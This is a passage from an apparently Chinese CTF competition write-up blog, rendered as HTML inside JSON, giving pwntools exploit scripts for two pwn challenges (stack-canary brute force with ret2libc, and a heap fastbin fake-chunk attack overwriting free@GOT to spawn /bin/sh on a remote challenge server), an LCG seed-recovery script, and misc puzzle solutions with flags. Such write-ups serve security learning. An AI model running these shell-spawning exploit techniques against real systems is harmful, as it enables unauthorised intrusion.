class=\"keyword\">if</span> <span class=\"string\">b&#x27;Successfully&#x27;</span> <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">                canary += <span class=\"built_in\">bytes</span>(<span class=\"built_in\">chr</span>(i).encode())</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(canary)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">len</span>(canary)!=<span class=\"number\">4</span>):</span><br><span class=\"line\">        find()</span><br><span class=\"line\"></span><br><span class=\"line\">find()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(canary)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./brute&#x27;</span>)</span><br><span class=\"line\">system = elf.plt[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">main = <span class=\"number\">0x08048560</span></span><br><span class=\"line\">p1 = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">100</span> + canary +<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">12</span>+ p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class=\"line\"><span class=\"comment\">#print(r.recvuntil(b&#x27;2021!\\n&#x27;))</span></span><br><span class=\"line\">r.sendline(p1)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr = u32(r.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;puts_addr:&#x27;</span>,puts_addr)</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class=\"line\">base = puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">sys_addr = base + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">bin_sh = base + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">p2 = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">100</span> + canary +<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">12</span>+ p32(sys_addr) +  <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">4</span> + p32(bin_sh)</span><br><span class=\"line\">r.sendline(p2)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure><br />\n 爆破好慢...<br />\nCUMTCTF{5305918b-e080-4f2d-b9b1-8a6f3ed727d5</p>\n<h3 id=\"pwn4\"><a class=\"anchor\" href=\"#pwn4\">#</a> pwn4</h3>\n<p>edit 的地方有个堆溢出漏洞</p>\n<p>l33t 是后门函数，想要触发需要使位于 bss 的 (unsigned __int64) magic &gt; 0x1305</p>\n<p>unsorted bin attack，修改 magic 的值为 unsorted bin 的地址，可以使 magic &gt; 0x1305</p>\n<p>...</p>\n<p>被坑了。。。</p>\n<p>竟然不是这个目录。。。。。。。。。。。</p>\n<p>然后打算修改一下 system 指令的字符串，发现这个字符串被存在 rodata，只读</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435338/Typera/2023/04/4c2f5f1d77fee1973ed990605f1b4cee.png\" alt=\"image-20230425230855187\" /></p>\n<p>只能重新搞</p>\n<p>想办法控制 heaparray，</p>\n<p>用 fake chunk 修改 heaparray [0] 为 free_got 的地址，然后用 edit () 修改 free_got 为 system 的地址</p>\n<p>接下来就 free 掉一个存了 /bin/sh\\x00 的 chunk，这样就可以 getshell 了，这个可以事先创建好这样的一个 chunk 来实现，然后用 delete_heap 调用 free</p>\n<p>fake chunk 的话，可以再搞两个 chunk，free 第一个 chunk，然后修改另一个造成堆溢出来修改第一个 chunk 的 fd 指针，使其指向 fake chunk</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r=process(&quot;./pwn4&quot;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;1.15.81.218&#x27;</span>, <span class=\"number\">10003</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn4&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">heaparray=<span class=\"number\">0x006020E0</span></span><br><span class=\"line\">fake_fastbin=<span class=\"number\">0x6020ad</span></span><br><span class=\"line\">system_addr=<span class=\"number\">0x400C2C</span></span><br><span class=\"line\">free_got=elf.got[<span class=\"string\">&quot;free&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Size of Heap : &quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Content of heap:&quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;SuccessFul&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Done !&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Size of Heap : &quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Content of heap : &quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Done !&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span>)  <span class=\"comment\"># idx0</span></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span>)  <span class=\"comment\"># idx1  </span></span><br><span class=\"line\">create(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;b&#x27;</span> * <span class=\"number\">0x10</span>)  <span class=\"comment\"># idx2 </span></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)  <span class=\"comment\"># id3 </span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">0x30</span>,<span class=\"number\">0x10</span> * <span class=\"string\">b&#x27;a&#x27;</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x71</span>) + p64(<span class=\"number\">0x6020ad</span>) + p64(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;d&#x27;</span> * <span class=\"number\">0x10</span>)  <span class=\"comment\"># idx1  </span></span><br><span class=\"line\">p=<span class=\"number\">0x23</span> * <span class=\"string\">b&#x27;e&#x27;</span> + p64(free_got)</span><br><span class=\"line\">create(<span class=\"number\">0x60</span>,p)  <span class=\"comment\"># idx4 </span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x8</span>,p64(<span class=\"number\">0x400C2C</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;Index :&quot;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"lcg\"><a class=\"anchor\" href=\"#lcg\">#</a> lcg</h3>\n<p>参考这个博客，可以直接出<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1cGVycHJpbnRmL2FydGljbGUvZGV0YWlscy8xMDg5NjQ1NjM=\"> https://blog.csdn.net/superprintf/article/details/108964563</span><br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gcd</span>(<span class=\"params\">a,b</span>): </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(b==<span class=\"number\">0</span>): </span><br><span class=\"line\">        <span class=\"keyword\">return</span> a </span><br><span class=\"line\">    <span class=\"keyword\">else</span>: </span><br><span class=\"line\">        <span class=\"keyword\">return</span> gcd(b,a%b) </span><br><span class=\"line\"></span><br><span class=\"line\">s = [<span class=\"number\">64053834035066785058511795263859088093402576718387054930069870694827422995248363210875296865931156540418540088656840163752864867889701529</span>, <span class=\"number\">62747878069691338351001678737533032651009187924993079609551517187402239263500990458468121965725468864035542647616568888614971291913860683</span>, <span class=\"number\">8610389166165547798963079074461089122942923569827711232062490735297527674581120584017030806864406444034839689358368567214353599295961192</span>, <span class=\"number\">67368398051089407366868405625671942347378755129423872678285919732014302509367453094142041707571135936337763803644340301362544880144675515</span>, <span class=\"number\">3140546334522640626644397935274312967014650101920766829848908314358452633165879115222769049730993718556007257838431843662986174886332684</span>, <span class=\"number\">86570894867827558107244361752089586436766881136739525172025909326268148819720261812567282066327259810017581923500053674785415315313293458</span>, <span class=\"number\">74270633946662538117925791534180331044438757906314082041974053142483165604719102121031974214138125154407150853174565679126633465007917723</span>, <span class=\"number\">82222345180880564316408536364709779418528442531150999715627704885024880160675971236916036110841803202987616501846568355385621016171784903</span>, <span class=\"number\">79833541796675422937999973936505826001046326324194169378072775519666431460490483847928549009565561011528302879850550395115321828798479473</span>, <span class=\"number\">70276250399219459795079058514491950109021040664671993784167534811426903455184545174600178849521746939676479421177456528336980088529680364</span>]</span><br><span class=\"line\">t = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>):</span><br><span class=\"line\">    t.append(s[i]-s[i-<span class=\"number\">1</span>]) </span><br><span class=\"line\">all_n = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    all_n.append(gcd((t[i+<span class=\"number\">1</span>]*t[i-<span class=\"number\">1</span>]-t[i]*t[i]), (t[i+<span class=\"number\">2</span>]*t[i]-t[i+<span class=\"number\">1</span>]*t[i+<span class=\"number\">1</span>]))) </span><br><span class=\"line\"></span><br><span class=\"line\">MMI = <span class=\"keyword\">lambda</span> A, n,s=<span class=\"number\">1</span>,t=<span class=\"number\">0</span>,N=<span class=\"number\">0</span>: (n &lt; <span class=\"number\">2</span> <span class=\"keyword\">and</span> t%N <span class=\"keyword\">or</span> MMI(n, A%n, t, s-A//n*t, N <span class=\"keyword\">or</span> n),-<span class=\"number\">1</span>)[n&lt;<span class=\"number\">1</span>] <span class=\"comment\">#逆元计算</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> all_n:</span><br><span class=\"line\">    n=<span class=\"built_in\">abs</span>(n)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> n==<span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span> (n)</span><br><span class=\"line\">    a=(s[<span class=\"number\">2</span>]-s[<span class=\"number\">1</span>])*MMI((s[<span class=\"number\">1</span>]-s[<span class=\"number\">0</span>]),n)%n</span><br><span class=\"line\">    a_phi=MMI(a,n)</span><br><span class=\"line\">    b=(s[<span class=\"number\">1</span>]-a*s[<span class=\"number\">0</span>])%n</span><br><span class=\"line\">    seed = (a_phi*(s[<span class=\"number\">0</span>]-b))%n</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(long_to_bytes(seed))</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"加密\"><a class=\"anchor\" href=\"#加密\">#</a> 加密？</h3>\n<p>跳舞的小人解出密码：SHERLOCK</p>\n<p>打开后看到一个空白的 txt 文件，查看内码，零宽解出：JKGASwqeeh!@$</p>\n<p>得到这个：63756D746374667B69745F69735F63727970746F3F7D</p>\n<p it_is_crypto?=\"\">base16 解密：cumtctf</p>\n<h3 id=\"社工\"><a class=\"anchor\" href=\"#社工\">#</a> 社工？</h3>\n<p>大意了，WANG/JIA 中间的斜杠还要保留</p>\n<p>去这里扫一下机票上的二维码：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZW1vLmR5bmFtc29mdC5jb20vYmFyY29kZS1yZWFkZXIv\">https://demo.dynamsoft.com/barcode-reader/</span></p>\n<p>得到信息：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435349/Typera/2023/04/6761b9a34806e510c91173b2704cebfa.png\" alt=\"image-20230425230905993\" /></p>\n<p>然后去搜一下飞机票二维码的数据信息</p>\n<p>M1 就是旅客姓名</p>\n<p WANGJIA=\"\">flag : cumtctf</p>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc",
                "Pwn"
            ]
        }
    ]
}